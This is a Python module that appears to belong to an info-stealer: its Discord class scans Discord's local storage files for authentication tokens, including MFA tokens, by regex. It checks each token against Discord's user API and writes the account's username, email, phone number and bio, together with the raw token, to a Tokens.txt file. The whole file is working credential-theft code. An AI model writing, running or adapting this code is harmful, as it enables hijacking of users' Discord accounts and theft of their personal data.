from re import findall
from json import loads
from multiprocessing import Process
from os import listdir, path, makedirs
from urllib.request import Request, urlopen

from ..utils.config import DiscordConfig


class Discord(Process):

    def __init__(self, *args):
        Process.__init__(self)

        self.config = DiscordConfig()

        for index, variable in enumerate(self.config.Variables):
            self.__dict__.update({variable: args[index]})

    def __create_folder(self):

        folder = rf"{self.storage_path}\{self.folder}"

        if not path.exists(folder):
            makedirs(folder)

    def __get_headers(self, token: str = None, content_type: str = "application/json"):

        headers = {
            "Content-Type": content_type,
            "User-Agent": self.config.UserAgent
        }

        if token is not None:
            headers.update({"Authorization": token})

        return headers

    def __get_tokens(self):

        valid = []
        invalid = []
        tokens = []

        if not path.exists(self.config.TokensPath):
            return

        for file in listdir(self.config.TokensPath):

            if file[-4:] not in [".log", ".ldb"]:
                continue

            for data in [line.strip() for line in open(rf"{self.config.TokensPath}\{file}", "r", errors="ignore", encoding="utf-8").readlines()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    [tokens.append(item) for item in findall(regex, data)]

        if not tokens:
            return

        self.__create_folder()

        for token in tokens:

            try:
                query = urlopen(Request(method="GET", url="https://discordapp.com/api/v6/users/@me", headers=self.__get_headers(token)))
                valid.append((token, query))
            except:
                invalid.append(token)

        temp = []

        for result in valid:

            storage = loads(result[1].read().decode("utf-8"))
            data = self.config.DiscordData

            temp.append(data.format(
                storage['username'] if storage['username'] else 'No data',
                storage['email'] if storage['email'] else 'No data',
                storage['phone'] if storage['phone'] else 'No data',
                storage['bio'] if storage['bio'] else 'No data',
                result[0]
            ))

        with open(rf"{self.storage_path}\{self.folder}\Tokens.txt", "a", encoding="utf-8") as discord:

            discord.write("Invalid tokens:\n" + "\n".join(item for item in invalid) + "\n\nValid tokens:\n")
            discord.write("".join(item for item in temp))

    def run(self):

        try:

            if self.statuses[0] is True:
                self.__get_tokens()

        except Exception as e:
            if self.errors is True: print(f"[Discord]: {repr(e)}")
